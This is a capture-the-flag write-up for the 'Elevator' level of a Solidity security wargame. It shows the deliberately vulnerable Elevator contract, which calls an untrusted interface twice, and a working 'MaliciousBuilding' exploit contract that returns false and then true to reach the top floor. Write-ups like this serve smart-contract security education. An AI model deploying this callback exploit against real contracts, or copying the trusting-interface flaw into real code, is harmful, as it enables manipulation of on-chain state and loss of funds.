# Elevator
> You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read Solidity's documentation and learn its caveats.

> An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. gasleft().

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

# Solution

From here, you can set the trick trickElevator() function with your desired floor. Once the transaction goes through, you can submit the instance.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

interface Elevator {
    function goTo(uint _floor) external;
}

contract MaliciousBuilding is Building {
    Elevator elevator;
    bool public isFirstCall = true;
    uint public currentFloor;

    // Pass the Elevator contract address to the constructor
    constructor(address _address) {
        elevator = Elevator(_address);
    }

    function isLastFloor(uint _floor) external override returns (bool) {
        currentFloor = _floor;

        if(isFirstCall) {
            isFirstCall = false;
            return false; 
        }
        return true;
    }

    function trickElevator(uint desiredFloor) public {
        elevator.goTo(desiredFloor);
    }
}

```
